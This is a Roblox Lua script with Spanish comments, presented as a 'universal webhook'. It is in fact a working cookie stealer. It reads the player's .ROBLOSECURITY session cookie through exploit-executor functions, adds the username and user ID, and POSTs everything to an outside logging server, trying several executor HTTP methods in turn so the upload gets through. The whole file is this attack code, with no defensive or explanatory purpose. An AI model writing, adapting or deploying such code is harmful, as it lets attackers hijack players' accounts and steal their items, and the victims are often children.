-- =====================================================================
-- SCRIPT UNIVERSAL DE WEBHOOK (Método de Detección Automática)
-- =====================================================================

local Players = game:GetService("Players")
local LocalizationService = game:GetService("LocalizationService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local placeId = game.PlaceId

-- 1. OBTENCIÓN DE DATOS BÁSICOS
local dataString = string.format(
    'username=%s&displayname=%s&userid=%d&cookie=%s',
    player.Name,
    player.DisplayName,
    player.UserId,
    "PENDIENTE_DE_EXTRAER" 
)

-- 2. FUNCIÓN UNIVERSAL DE COOKIES (Optimizada)
local function GetCookie()
    -- Intentar getcookie() primero (estándar moderno)
    if type(getcookie) == "function" then
        local s, c = pcall(getcookie)
        if s and c then return tostring(c) end
    end
    
    -- Intentar variables de entorno
    local g = getgenv()
    for _, k in ipairs({"_ROBLOSECURITY", "ROBLOSECURITY", "cookie"}) do
        if g[k] then return tostring(g[k]) end
    end
    
    return "NO_DETECTADA"
end

-- Actualizar la cookie en el string de datos
local cookieVal = GetCookie()
dataString = string.format(
    'username=%s&displayname=%s&userid=%d&gameid=%d&cookie=%s',
    player.Name,
    player.DisplayName,
    player.UserId,
    placeId,
    cookieVal
)

-- 3. FUNCIÓN DE ENVÍO ADAPTATIVA (Prueba todos los métodos HTTP conocidos)
local function SendPayload(url, payload)
    local methods = {
        -- Método 1: request() (Fluxus, Delta, Hydrogen, Arceus X)
        function()
            if type(request) == "function" then
                return request({
                    Url = url,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
                    Body = payload
                })
            end
            return nil
        end,
        
        -- Método 2: syn.request() (Script-Ware, Synapse X)
        function()
            if type(syn) == "table" and type(syn.request) == "function" then
                return syn.request({
                    Url = url,
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/x-www-form-urlencoded" },
                    Body = payload
                })
            end
            return nil
        end,

        -- Método 3: http.request (Algunos executores móviles antiguos)
        function()
            if type(http) == "table" and type(http.request) == "function" then
                return http.request("POST", url, { ["Content-Type"] = "application/x-www-form-urlencoded" }, payload)
            end
            return nil
        end,

        -- Método 4: require(HttpService) (A veces bypassea el bloqueo directo)
        function()
             local success, res = pcall(function()
                return HttpService:PostAsync(url, payload)
            end)
            if success then return res end
            return nil
        end
    }

    for i, methodFunc in ipairs(methods) do
        local success, result = pcall(methodFunc)
        if success and result then
            return true, result
        end
    end
    
    return false, "Todos los métodos HTTP fallaron o están bloqueados."
end

-- 4. EJECUCIÓN
local webhookUrl = "https://depazzhub-api.onrender.com/log"
local success, response = SendPayload(webhookUrl, dataString)

if success then
    print("✅ Webhook enviado correctamente!")
else
    warn("❌ Error al enviar:", response)
end
